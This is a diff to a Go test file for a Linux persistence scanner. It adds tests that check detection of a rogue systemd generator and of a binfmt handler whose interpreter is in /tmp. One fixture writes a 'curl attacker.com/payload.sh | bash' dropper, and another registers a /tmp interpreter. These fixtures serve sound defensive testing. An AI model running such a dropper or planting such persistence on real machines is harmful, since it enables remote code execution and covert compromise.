@@ -1121,3 +1121,69 @@ WantedBy=sockets.target
 		t.Errorf("expected Persistence_Systemd_Socket_Activation finding, got: %+v", rep.findings)
 	}
 }
+
+func TestPersistence_SystemdGenerator(t *testing.T) {
+	root := t.TempDir()
+	genDir := filepath.Join(root, "etc/systemd/system-generators")
+	_ = os.MkdirAll(genDir, 0755)
+
+	// 1. Unowned generator script with curl | bash dropper -> ALERT (Persistence_Systemd_Generator_Suspicious_Target / Malicious)
+	evilScript := "#!/bin/sh\ncurl http://attacker.com/payload.sh | bash\n"
+	_ = os.WriteFile(filepath.Join(genDir, "00-net-gen"), []byte(evilScript), 0755)
+
+	cfg := config.NewDefaultConfig()
+	rep := &memoryReporter{}
+	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
+
+	err := mod.Run(context.Background(), cfg, rep)
+	if err != nil {
+		t.Fatalf("unexpected error running persistence module: %v", err)
+	}
+
+	foundGen := false
+	for _, f := range rep.findings {
+		if strings.Contains(f.RuleName, "Persistence_Systemd_Generator") {
+			foundGen = true
+			if f.Severity != report.SeverityAlert && f.Severity != report.SeverityWarning {
+				t.Errorf("expected ALERT or WARNING for rogue generator, got %s", f.Severity)
+			}
+		}
+	}
+
+	if !foundGen {
+		t.Errorf("expected Persistence_Systemd_Generator finding, got: %+v", rep.findings)
+	}
+}
+
+func TestPersistence_BinfmtHandler(t *testing.T) {
+	root := t.TempDir()
+	binfmtDir := filepath.Join(root, "etc/binfmt.d")
+	_ = os.MkdirAll(binfmtDir, 0755)
+
+	// Binfmt registration with interpreter in /tmp -> ALERT (Persistence_Binfmt_Suspicious_Interpreter)
+	confContent := ":custom-format:E::bin::/tmp/evil_interp:\n"
+	_ = os.WriteFile(filepath.Join(binfmtDir, "custom.conf"), []byte(confContent), 0644)
+
+	cfg := config.NewDefaultConfig()
+	rep := &memoryReporter{}
+	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
+
+	err := mod.Run(context.Background(), cfg, rep)
+	if err != nil {
+		t.Fatalf("unexpected error running persistence module: %v", err)
+	}
+
+	foundBinfmt := false
+	for _, f := range rep.findings {
+		if strings.Contains(f.RuleName, "Persistence_Binfmt_Suspicious_Interpreter") {
+			foundBinfmt = true
+			if f.Severity != report.SeverityWarning && f.Severity != report.SeverityAlert {
+				t.Errorf("expected WARNING or ALERT for /tmp binfmt interpreter, got %s", f.Severity)
+			}
+		}
+	}
+
+	if !foundBinfmt {
+		t.Errorf("expected Persistence_Binfmt_Suspicious_Interpreter finding, got: %+v", rep.findings)
+	}
+}
